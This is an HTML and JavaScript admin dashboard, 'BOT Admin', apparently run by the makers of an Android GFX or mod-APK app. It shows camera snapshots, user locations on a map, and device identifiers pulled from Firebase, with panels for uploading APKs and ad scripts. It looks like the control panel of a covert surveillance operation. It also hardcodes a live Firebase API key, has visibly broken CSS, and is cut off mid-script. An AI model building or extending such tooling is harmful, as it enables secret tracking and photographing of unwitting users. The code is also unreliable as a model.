<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BOT Admin Panel</title>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <!-- Chart.js -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root {
            --primary-color: #2c3e50;
            --secondary-color: #34495e;
            --accent-color: #3498db;
            --danger-color: #e74c3c;
            --success-color: #2ecc71;
            --warning-color: #f39c12;
            --light-color: #ecf0f1;
            --dark-color: #2c3e50;
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f7fa;
            color: #333;
            line-height: 1.6;
        }
        .container {
            display: grid;
            grid-template-columns: 250px 1fr;
            min-height: 100vh;
        }
        /* Sidebar */
        .sidebar {
            background: var(--primary-color);
            color: white;
            padding: 20px 0;
            box-shadow: 2px 0 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            padding: 0 20px 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .logo h2 {
            font-size: 1.5rem;
            margin-bottom: 5px;
        }
        .logo p {
            font-size: 0.8rem;
            opacity: 0.7;
        }
        .nav-menu {
            margin-top: 20px;
        }
        .nav-item {
            padding: 12px 20px;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
        }
        .nav-item:hover, .nav-item.active {
            background: rgba(255,255,255,0.1);
        }
        .nav-item i {
            margin-right: 10px;
            font-size: 1.1rem;
        }
        /* Main Content */
        .main-content {
            padding: 20px;
            overflow-y: auto;
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid #ddd;
        }
        .header h1 {
            font-size: 1.8rem;
            color: var(--primary-color);
        }
        .user-info {
            display: flex;
            align-items: center;
        }
        .user-info img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            margin-right: 10px;
        }
        /* Mobile Nav Toggle (Hamburger) */
        .mobile-nav-toggle {
            display: none;
            background: var(--accent-color);
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            font-size: 1.2rem;
            cursor: pointer;
            z-index: 1001;
            margin-right: 15px;
        }
        /* Cards */
        .cards {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 30px;
        }
        .card {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .card h3 {
            font-size: 0.9rem;
            color: #7f8c8d;
            margin-bottom: 10px;
        }
        .card .value {
            font-size: 1.8rem;
            font-weight: bold;
            color: var(--primary-color);
        }
        .card .trend {
            display: flex;
            align-items: center;
            margin-top: 10px;
            font-size: 0.9rem;
        }
        .trend.up {
            color: var(--success-color);
        }
        .trend.down {
            color: var(--danger-color);
        }
        /* Charts */
        .chart-container {
            background: white;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .chart-container h2 {
            margin-bottom: 20px;
            color: var(--primary-color);
        }
        .chart-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        /* Data Tables */
        .data-table {
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            margin-bottom: 30px;
        }
        .table-header {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .table-header h2 {
            color: var(--primary-color);
            flex-grow: 1;
        }
        .table-actions {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn {
            padding: 8px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.9rem;
            transition: all 0.3s;
            min-width: 80px;
            text-align: center;
        }
        .btn-primary {
            background: var(--accent-color);
            color: white;
        }
        .btn-danger {
            background: var(--danger-color);
            color: white;
        }
        .btn-success {
            background: var(--success-color);
            color: white;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            display: block;
            overflow-x: auto;
            white-space: nowrap;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #eee;
            vertical-align: middle;
        }
        th {
            background: #f8f9fa;
            font-weight: 600;
            color: var(--primary-color);
        }
        tr:hover {
            background: #f8f8f9;
        }
        .status {
            display: inline-block;
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 500;
        }
        .status.active {
            background: #d4edda;
            color: #155724;
        }
        .status.inactive {
            background: #f8d7da;
            color: #721c24;
        }
    }
        .status.pending {
            background: #f8d7da;
            color: #721c24;
        }
        .status.responded {
            background: #fff3cd;
            color: #856404;
        }
        .status.resolved {
            background: #d4ed8;
            color: #155724;
        }
        /* Image Preview */
        .image-preview {
            width: relative;
            height: auto;
            object-fit: cover;
            border-radius: 4px;
            cursor: pointer;
            transition: transform 0.3s;
        }
        .image-preview:hover {
            transform: scale(1.5);
        }
        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: full100%;
            background: rgba(0,0,0,0.7);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: white;
            border-radius: 8px;
            max-width: 800px;
            width: 90%;
            max-height: 90vh;
            overflow: auto;
            position: relative;
        }
        .modal-header {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .modal-header h2 {
            color: var(--primary-color);
        }
        .modal-close {
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: #7f8c8d;
        }
        .modal-body {
            padding: 20px;
        }
        .modal-image {
            width: 100%;
            max-height: 70vh;
            object-fit: contain;
        }
        .image-meta {
            margin-top: 20px;
        }
        .meta-item {
            margin-bottom: items10px;
        }
        .meta-label {
            font-weight: bold;
            color: var(--primary-color);
            display: inline-block;
            width: 120px;
        }
        /* Map Container */
        #mapContainer {
            height: 400px;
            width: 100%;
            border-radius: 8px;
            overflow: hidden;
            margin-top: 20px;
        }
        /* Live Camera Feed Specific Styles */
        .live-camera-controls {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .controls {
            #liveVideo {
            width: 100%;
            max-width: 600px;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            background-color: #000;
            }
        }
        .current-live-image {
            width: relative;
            margin-top: 20px;
            text-align: center;
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        .current-live-image img {
            max-width: 100%;
            max-height: 400px;
            object-fit: contain;
            border-radius: 4px;
            margin-bottom: 15px;
        }
        .current-live-image p {
            color: #555;
            font-size: 0.9rem;
        }
        /* Form Styling */
        .form-container {
            background: white;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            margin-bottom: 30px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        .form-group input,
        .form-group textarea {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 0.9rem;
        }
        .form-group textarea {
            resize: vertical;
            min-height: 100px;
        }
        /* Overlay for mobile sidebar */
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 999;
        }
        /* Responsive Breakpoints */
        @media (max-width: 1200px) {
            .cards {
                grid-template-columns: repeat(2, 1fr);
            }
            .chart-row {
                grid-template-columns: 1fr;
            }
        }
        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
            }
            .sidebar {
                position: fixed;
                top: 0;
                left: -250px;
                height: 100vh;
                overflow-y: auto;
                transition: left 0.3s ease-in-out;
                z-index: 1000;
            }
            body.sidebar-open .sidebar {
                left: 0;
            }
            body.sidebar-open .overlay {
                display: block;
            }
            .main-content {
                padding: 15px;
            }
            .header {
                justify-content: flex-start;
            }
            .header h1 {
                font-size: 1.5rem;
                flex-grow: 1;
            }
            .user-info {
                display: none;
            }
            .mobile-nav-toggle {
                display: block;
            }
            .cards {
                grid-template-columns: 1fr;
            }
            .table-header {
                flex-direction: column;
                align-items: flex-start;
            }
            .table-actions {
                width: 100%;
                justify-content: flex-start;
                margin-top: 10px;
            }
            .btn {
                width: auto;
                min-width: unset;
                flex-grow: 1;
            }
            .modal-content {
                width: 95%;
                max-width: 95%;
                height: 95%;
                max-height: 95%;
                margin: auto;
            }
            .modal-body {
                padding: 15px;
            }
            .modal-image {
                max-height: 60vh;
            }
            .image-meta {
                font-size: 0.9rem;
            }
            .meta-label {
                width: 100px;
            }
            th, td {
                font-size: 0.85rem;
            }
        }
    </style>
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Leaflet for maps -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
</head>
<body>
    <div class="container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="logo">
                <h2>BOT Admin</h2>
                <p>Monitoring Dashboard</p>
            </div>
            <div class="nav-menu">
                <div class="nav-item active" data-section="dashboard">
                    <i class="fas fa-tachometer-alt"></i>
                    <span>Dashboard</span>
                </div>
                <div class="nav-item" data-section="snapshots">
                    <i class="fas fa-camera"></i>
                    <span>BOT Snapshots</span>
                </div>
                <div class="nav-item" data-section="liveCameraFeed">
                    <i class="fas fa-video"></i>
                    <span>Live Camera Feed</span>
                </div>
                <div class="nav-item" data-section="locations">
                    <i class="fas fa-map-marker-alt"></i>
                    <span>User Locations</span>
                </div>
                <div class="nav-item" data-section="devices">
                    <i class="fas fa-mobile-alt"></i>
                    <span>Device Info</span>
                </div>
                <div class="nav-item" data-section="settings">
                    <i class="fas fa-cog"></i>
                    <span>Settings</span>
                </div>
                <div class="nav-item" data-section="modApk">
                    <i class="fas fa-mobile-alt"></i>
                    <span>MOD APK</span>
                </div>
                <div class="nav-item" data-section="help">
                    <i class="fas fa-question-circle"></i>
                    <span>Help</span>
                </div>
                <div class="nav-item" data-section="support">
                    <i class="fas fa-headset"></i>
                    <span>Support</span>
                </div>
                <div class="nav-item" data-section="adsterra">
                    <i class="fas fa-ad"></i>
                    <span>Adsterra Ads</span>
                </div>
            </div>
        </div>

        <!-- Overlay for mobile sidebar -->
        <div class="overlay"></div>

        <!-- Main Content -->
        <div class="main-content">
            <div class="header">
                <button class="mobile-nav-toggle" aria-label="Open navigation">
                    <i class="fas fa-bars"></i>
                </button>
                <h1 id="currentSectionTitle">Dashboard Overview</h1>
                <div class="user-info">
                    <img src="https://ui-avatars.com/api/?name=Admin&background=3498db&color=fff" alt="Admin">
                    <span>Admin</span>
                </div>
            </div>

            <!-- Dashboard Section -->
            <div id="dashboard" class="section">
                <!-- Stats Cards -->
                <div class="cards">
                    <div class="card">
                        <h3>Total Snapshots</h3>
                        <div class="value" id="totalSnapshots">0</div>
                        <div class="trend up">
                            <i class="fas fa-arrow-up"></i>
                            <span>12% from yesterday</span>
                        </div>
                    </div>
                    <div class="card">
                        <h3>Active Today</h3>
                        <div class="value" id="activeToday">0</div>
                        <div class="trend up">
                            <i class="fas fa-arrow-up"></i>
                            <span>5% from yesterday</span>
                        </div>
                    </div>
                    <div class="card">
                        <h3>Unique Devices</h3>
                        <div class="value" id="uniqueDevices">0</div>
                        <div class="trend down">
                            <i class="fas fa-arrow-down"></i>
                            <span>3% from yesterday</span>
                        </div>
                    </div>
                    <div class="card">
                        <h3>Locations</h3>
                        <div class="value" id="totalLocations">0</div>
                        <div class="trend up">
                            <i class="fas fa-arrow-up"></i>
                            <span>8% from yesterday</span>
                        </div>
                    </div>
                </div>

                <!-- Charts Row -->
                <div class="chart-row">
                    <div class="chart-container">
                        <h2>Snapshots Timeline</h2>
                        <canvas id="snapshotsChart"></canvas>
                    </div>
                    <div class="chart-container">
                        <h2>Device Distribution</h2>
                        <canvas id="devicesChart"></canvas>
                    </div>
                </div>

                <!-- Recent Activity -->
                <div class="data-table">
                    <div class="table-header">
                        <h2>Recent Activity</h2>
                        <div class="table-actions">
                            <button class="btn btn-primary" id="refreshRecent">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>Device</th>
                                <th>Type</th>
                                <th>Status</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="recentActivity">
                            <!-- Data will be inserted here -->
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Snapshots Section -->
            <div id="snapshots" class="section" style="display: none;">
                <div class="data-table">
                    <div class="table-header">
                        <h2>BOT Snapshots</h2>
                        <div class="table-actions">
                            <button class="btn btn-danger" id="deleteAllSnapshots">
                                <i class="fas fa-trash"></i> Delete All
                            </button>
                            <button class="btn btn-primary" id="refreshSnapshots">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Preview</th>
                                <th>Timestamp</th>
                                <th>Device</th>
                                <th>Resolution</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="snapshotsList">
                            <!-- Data will be inserted here -->
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Live Camera Feed Section -->
            <div id="liveCameraFeed" class="section" style="display: none;">
                <div class="chart-container">
                    <h2>Live Camera Feed</h2>
                    <p style="margin-bottom: 15px; color: #7f8c8d;">This feature accesses the camera of the device running this admin panel to provide a live feed and capture images every 5 seconds. You will be prompted for camera permission.</p>
                    <div class="live-camera-controls">
                        <button class="btn btn-success" id="startLiveFeedBtn">
                            <i class="fas fa-play"></i> Start Live Feed
                        </button>
                        <button class="btn btn-danger" id="stopLiveFeedBtn" disabled>
                            <i class="fas fa-stop"></i> Stop Live Feed
                        </button>
                    </div>
                    <video id="liveVideo" autoplay muted style="width: 100%; max-width: 600px; height: auto; display: none;"></video>
                    <canvas id="liveCanvas" style="display: none;"></canvas>

                    <div class="current-live-image-container">
                        <h3>Latest Captured Live Image</h3>
                        <img id="latestLiveImage" src="https://via.placeholder.com/400x300?text=No+Live+Image" alt="Latest Live Image">
                        <p id="latestLiveImageTimestamp">No image captured yet.</p>
                    </div>
                </div>
            </div>

            <!-- Locations Section -->
            <div id="locations" class="section" style="display: none;">
                <div class="data-table">
                    <div class="table-header">
                        <h2>User Locations</h2>
                        <div class="table-actions">
                            <button class="btn btn-primary" id="refreshLocations">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Timestamp</th>
                                <th>Coordinates</th>
                                <th>Map Link</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="locationsList">
                            <!-- Data will be inserted here -->
                        </tbody>
                    </table>
                </div>
                <div id="mapContainer"></div>
            </div>

            <!-- Devices Section -->
            <div id="devices" class="section" style="display: none;">
                <div class="data-table">
                    <div class="table-header">
                        <h2>Device Information</h2>
                        <div class="table-actions">
                            <button class="btn btn-primary" id="refreshDevices">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Device ID</th>
                                <th>User Agent</th>
                                <th>First Seen</th>
                                <th>Last Active</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody id="devicesList">
                            <!-- Data will be inserted here -->
                        </tbody>
                    </table>
                </div>
            </div>

            <!-- Settings Section -->
            <div id="settings" class="section" style="display: none;">
                <div class="chart-container">
                    <h2>Admin Settings</h2>
                    <form id="adminSettings">
                        <div style="margin-bottom: 20px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold;">Snapshot Interval (seconds)</label>
                            <input type="number" id="snapshotInterval" min="1" max="60" style="padding: 8px; width: 100px; border: 1px solid #ddd; border-radius: 4px;">
                        </div>
                        <div style="margin-bottom: 20px;">
                            <label style="display: block; margin-bottom: 8px; font-weight: bold;">Data Retention (days)</label>
                            <input type="number" id="dataRetention" min="1" max="365" style="padding: 8px; width: 100px; border: 1px solid #ddd; border-radius: 4px;">
                        </div>
                        <button type="button" class="btn btn-success" id="saveSettings">
                            <i class="fas fa-save"></i> Save Settings
                        </button>
                    </form>
                </div>
            </div>

            <!-- MOD APK Section -->
            <div id="modApk" class="section" style="display: none;">
                <div class="form-container">
                    <h2>Add New MOD APK</h2>
                    <form id="modApkForm">
                        <div class="form-group">
                            <label for="apkName">APK Name</label>
                            <input type="text" id="apkName" required>
                        </div>
                        <div class="form-group">
                            <label for="apkDescription">Description</label>
                            <textarea id="apkDescription" required></textarea>
                        </div>
                        <div class="form-group">
                            <label for="apkFile">APK File</label>
                            <input type="file" id="apkFile" accept=".apk" required>
                        </div>
                        <div class="form-group">
                            <label for="apkVersion">Version</label>
                            <input type="text" id="apkVersion" required>
                        </div>
                        <div class="form-group">
                            <label for="apkSize">Size (MB)</label>
                            <input type="number" id="apkSize" step="0.1" required>
                        </div>
                        <button type="button" class="btn btn-success" id="addApk">
                            <i class="fas fa-plus"></i> Add APK
                        </button>
                    </form>
                </div>
                <div class="data-table">
                    <div class="table-header">
                        <h2>MOD APKs</h2>
                        <div class="table-actions">
                            <button class="btn btn-primary" id="refreshApks">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Version</th>
                                <th>Size</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="apkList"></tbody>
                    </table>
                </div>
            </div>

            <!-- Help Section -->
            <div id="help" class="section" style="display: none;">
                <div class="form-container">
                    <h2>Update Help Content</h2>
                    <form id="helpForm">
                        <div class="form-group">
                            <label for="helpContent">Help Text</label>
                            <textarea id="helpContent" required></textarea>
                        </div>
                        <button type="button" class="btn btn-success" id="saveHelp">
                            <i class="fas fa-save"></i> Save Help
                        </button>
                    </form>
                </div>
            </div>

            <!-- Support Section -->
            <div id="support" class="section" style="display: none;">
                <div class="data-table">
                    <div class="table-header">
                        <h2>Support Queries</h2>
                        <div class="table-actions">
                            <button class="btn btn-primary" id="refreshSupport">
                                <i class="fas fa-sync-alt"></i> Refresh
                            </button>
                        </div>
                    </div>
                    <table>
                        <thead>
                            <tr>
                                <th>Subject</th>
                                <th>Status</th>
                                <th>Timestamp</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody id="supportList"></tbody>
                    </table>
                </div>
            </div>

            <!-- Adsterra Ads Section -->
            <div id="adsterra" class="section" style="display: none;">
                <div class="form-container">
                    <h2>Manage Adsterra Ads Code</h2>
                    <form id="adsterraForm">
                        <div class="form-group">
                            <label for="adsterraCode">Adsterra Ads Script</label>
                            <textarea id="adsterraCode" placeholder="Paste Adsterra ad script here..."></textarea>
                        </div>
                        <button type="button" class="btn btn-success" id="saveAdsterra">
                            <i class="fas fa-save"></i> Save Ad Code
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Image Preview Modal -->
    <div class="modal" id="imageModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Snapshot Details</h2>
                <button class="close-modal">×</button>
            </div>
            <div class="modal-body">
                <img src="" alt="Full Snapshot" class="modal-image" id="modalImage">
                <div class="image-meta" id="imageMeta">
                    <!-- Metadata and download button will be inserted here -->
                </div>
            </div>
        </div>
    </div>

    <!-- Location Map Modal -->
    <div class="modal" id="mapModal">
        <div class="modal-content" style="width: 90%; height: 90%;">
            <div class="modal-header">
                <h2>Location Details</h2>
                <button class="close-modal">×</button>
            </div>
            <div class="modal-body" style="height: calc(100% - 60px); padding: 0;">
                <div id="detailedMap" style="height: 100%;"></div>
            </div>
        </div>
    </div>

    <script>
        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyD6EXA7D77rQDQEohB52BvTYimFeTEaAho",
            authDomain: "rn-gfx-tool.firebaseapp.com",
            databaseURL: "https://rn-gfx-tool-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "rn-gfx-tool",
            storageBucket: "rn-gfx-tool.firebasestorage.app",
            messagingSenderId: "163149358541",
            appId: "1:163149358541:android:2ef6d22fcd23e77ee09084"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const storage = firebase.storage();

        // DOM Elements
        const sections = document.querySelectorAll('.section');
        const navItems = document.querySelectorAll('.nav-item');
        const currentSectionTitle = document.getElementById('currentSectionTitle');
        const mobileNavToggle = document.querySelector('.mobile-nav-toggle');
        const overlay = document.querySelector('.overlay');
        const modal = document.getElementById('imageModal');
        const mapModal = document.getElementById('mapModal');
        const modalImage = document.getElementById('modalImage');
        const imageMeta = document.getElementById('imageMeta');
        const closeModalButtons = document.querySelectorAll('.close-modal');
        let map, detailedMap;
        let markers = [];
        let snapshotsChart, devicesChart;

        // Live Camera Feed Elements
        const liveVideoElement = document.getElementById('liveVideo');
        const liveCanvasElement = document.getElementById('liveCanvas');
        const startLiveFeedBtn = document.getElementById('startLiveFeedBtn');
        const stopLiveFeedBtn = document.getElementById('stopLiveFeedBtn');
        const latestLiveImage = document.getElementById('latestLiveImage');
        const latestLiveImageTimestamp = document.getElementById('latestLiveImageTimestamp');

        let liveStream = null;
        let liveInterval = null;

        // Section Titles
        const sectionTitles = {
            dashboard: "Dashboard Overview",
            snapshots: "BOT Snapshots",
            liveCameraFeed: "Live Camera Feed",
            locations: "User Locations",
            devices: "Device Information",
            settings: "Admin Settings",
            modApk: "MOD APK Management",
            help: "Help Content",
            support: "Support Queries",
            adsterra: "Adsterra Ads"
        };

        // Navigation and Mobile Menu Logic
        mobileNavToggle.addEventListener('click', () => {
            document.body.classList.toggle('sidebar-open');
        });

        overlay.addEventListener('click', () => {
            document.body.classList.remove('sidebar-open');
        });

        navItems.forEach(item => {
            item.addEventListener('click', () => {
                navItems.forEach(nav => nav.classList.remove('active'));
                item.classList.add('active');
                sections.forEach(section => section.style.display = 'none');
                const sectionId = item.getAttribute('data-section');
                document.getElementById(sectionId).style.display = 'block';
                currentSectionTitle.textContent = sectionTitles[sectionId] || "Admin Panel";
                if (window.innerWidth <= 768) {
                    document.body.classList.remove('sidebar-open');
                }
                if (liveStream && sectionId !== 'liveCameraFeed') {
                    stopLiveCameraFeed();
                }
                if (sectionId === 'locations') {
                    setTimeout(() => {
                        if (!map) initMap();
                        map.invalidateSize();
                    }, 100);
                }
                loadSectionData(sectionId);
            });
        });

        // Close modals
        closeModalButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                modal.style.display = 'none';
                mapModal.style.display = 'none';
            });
        });

        window.addEventListener('click', (e) => {
            if (e.target === modal) modal.style.display = 'none';
            if (e.target === mapModal) mapModal.style.display = 'none';
        });

        // Initialize main map
        function initMap() {
            if (map) map.remove();
            map = L.map('mapContainer').setView([20, 0], 2);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }).addTo(map);
            map.invalidateSize();
            loadLocations();
        }

        // Initialize detailed map in modal
        function initDetailedMap(lat, lng) {
            if (detailedMap) {
                detailedMap.remove();
            }
            detailedMap = L.map('detailedMap').setView([lat, lng], 13);
            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
            }).addTo(detailedMap);
            L.marker([lat, lng]).addTo(detailedMap)
                .bindPopup(`<b>User Location</b><br>Lat: ${lat}<br>Lng: ${lng}`)
                .openPopup();
            detailedMap.invalidateSize();
        }

        // View location in modal
        function viewLocationOnMap(lat, lng) {
            mapModal.style.display = 'flex';
            setTimeout(() => {
                initDetailedMap(lat, lng);
            }, 100);
        }

        // Load section data
        function loadSectionData(sectionId) {
            switch(sectionId) {
                case 'dashboard':
                    loadDashboardData();
                    break;
                case 'snapshots':
                    loadSnapshots();
                    break;
                case 'liveCameraFeed':
                    loadLiveFeedData();
                    break;
                case 'locations':
                    loadLocations();
                    break;
                case 'devices':
                    loadDevices();
                    break;
                case 'settings':
                    loadSettings();
                    break;
                case 'modApk':
                    loadMods();
                    break;
                case 'help':
                    loadHelp();
                    break;
                case 'support':
                    loadSupport();
                    break;
                case 'adsterra':
                    loadAdsterra();
                    break;
            }
        }

        // Load dashboard data
        async function loadDashboardData() {
            try {
                const snapshotsSnapshot = await database.ref('botSnapshots').once('value');
                const snapshotsData = snapshotsSnapshot.val();
                const totalSnapshots = snapshotsData ? Object.keys(snapshotsData).length : 0;
                document.getElementById('totalSnapshots').textContent = totalSnapshots;
                
                const today = new Date().toDateString();
                let todayCount = 0;
                if (snapshotsData) {
                    Object.values(snapshotsData).forEach(item => {
                        const itemDate = new Date(item.timestamp).toDateString();
                        if (itemDate === today) todayCount++;
                    });
                }
                document.getElementById('activeToday').textContent = todayCount;
                
                const devices = new Set();
                if (snapshotsData) {
                    Object.values(snapshotsData).forEach(item => {
                        if (item.deviceInfo) devices.add(item.deviceInfo);
                    });
                }
                document.getElementById('uniqueDevices').textContent = devices.size;
                
                loadRecentActivity(snapshotsData);
                prepareChartData(snapshotsData);

                const locationSnapshot = await database.ref('userData/location').once('value');
                const locationData = locationSnapshot.val();
                const totalLocations = locationData ? 1 : 0;
                document.getElementById('totalLocations').textContent = totalLocations;

            } catch (error) {
                console.error('Error loading dashboard data:', error);
                alert('Failed to load dashboard data: ' + error.message);
            }
        }

        // Load recent activity
        function loadRecentActivity(snapshotsData) {
            const tbody = document.getElementById('recentActivity');
            tbody.innerHTML = '';
            
            if (!snapshotsData) {
                tbody.innerHTML = '<tr><td colspan="5">No recent activity</td></tr>';
                return;
            }
            
            const lastSnapshots = Object.entries(snapshotsData)
                .sort((a, b) => b[1].timestamp - a[1].timestamp)
                .slice(0, 5);
            
            lastSnapshots.forEach(([key, snapshot]) => {
                const row = document.createElement('tr');
                const date = new Date(snapshot.timestamp);
                
                row.innerHTML = `
                    <td>${date.toLocaleString()}</td>
                    <td>${snapshot.deviceInfo ? snapshot.deviceInfo.substring(0, Math.min(snapshot.deviceInfo.length, 30)) + (snapshot.deviceInfo.length > 30 ? '...' : '') : 'Unknown'}</td>
                    <td>Snapshot</td>
                    <td><span class="status active">Active</span></td>
                    <td>
                        <button class="btn btn-primary" onclick="viewSnapshot('${key}')">
                            <i class="fas fa-eye"></i> View
                        </button>
                    </td>
                `;
                tbody.appendChild(row);
            });
        }

        // Prepare chart data
        function prepareChartData(snapshotsData) {
            if (!snapshotsData) {
                if (snapshotsChart) snapshotsChart.destroy();
                if (devicesChart) devicesChart.destroy();
                return;
            }
            
            const dates = [];
            const counts = [];
            const now = new Date();
            
            for (let i = 6; i >= 0; i--) {
                const date = new Date(now);
                date.setDate(date.getDate() - i);
                const dateStr = date.toDateString();
                dates.push(dateStr.substring(0, dateStr.length - 5));
                
                let count = 0;
                Object.values(snapshotsData).forEach(item => {
                    const itemDate = new Date(item.timestamp).toDateString();
                    if (itemDate === dateStr) count++;
                });
                counts.push(count);
            }
            
            const devices = {};
            Object.values(snapshotsData).forEach(item => {
                if (!item.deviceInfo) return;
                
                let deviceName = 'Other';
                const ua = item.deviceInfo.toLowerCase();
                
                if (ua.includes('android')) deviceName = 'Android';
                else if (ua.includes('iphone') || ua.includes('ipad') || ua.includes('ios')) deviceName = 'iOS';
                else if (ua.includes('windows')) deviceName = 'Windows';
                else if (ua.includes('macintosh') || ua.includes('macos')) deviceName = 'Mac';
                else if (ua.includes('linux')) deviceName = 'Linux';
                
                devices[deviceName] = (devices[deviceName] || 0) + 1;
            });
            
            const deviceLabels = Object.keys(devices);
            const deviceData = Object.values(devices);
            
            const ctx1 = document.getElementById('snapshotsChart').getContext('2d');
            if (snapshotsChart) {
                snapshotsChart.data.labels = dates;
                snapshotsChart.data.datasets[0].data = counts;
                snapshotsChart.update();
            } else {
                snapshotsChart = new Chart(ctx1, {
                    type: 'line',
                    data: {
                        labels: dates,
                        datasets: [{
                            label: 'Snapshots per day',
                            data: counts,
                            backgroundColor: 'rgba(52, 152, 219, 0.2)',
                            borderColor: 'rgba(52, 152, 219, 1)',
                            borderWidth: 2,
                            tension: 0.3,
                            fill: true
                        }]
                    },
                    options: {
                        responsive: true,
                        plugins: {
                            legend: {
                                position: 'top',
                            }
                        },
                        scales: {
                            y: {
                                beginAtZero: true,
                                precision: 0
                            }
                        }
                    }
                });
            }
            
            const ctx2 = document.getElementById('devicesChart').getContext('2d');
            if (devicesChart) {
                devicesChart.data.labels = deviceLabels;
                devicesChart.data.datasets[0].data = deviceData;
                devicesChart.update();
            } else {
                devicesChart = new Chart(ctx2, {
                    type: 'doughnut',
                    data: {
                        labels: deviceLabels,
                        datasets: [{
                            data: deviceData,
                            backgroundColor: [
                                'rgba(52, 152, 219, 0.7)',
                                'rgba(46, 204, 113, 0.7)',
                                'rgba(155, 89, 182, 0.7)',
                                'rgba(241, 196, 15, 0.7)',
                                'rgba(231, 76, 60, 0.7)',
